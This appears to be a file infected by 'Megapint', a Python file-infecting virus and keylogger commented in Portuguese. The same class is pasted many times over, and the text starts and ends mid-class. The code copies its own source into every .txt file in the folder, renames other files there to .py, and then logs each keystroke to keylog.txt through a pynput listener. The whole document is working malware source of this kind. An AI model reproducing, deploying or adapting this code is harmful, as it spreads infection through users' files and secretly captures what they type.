        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
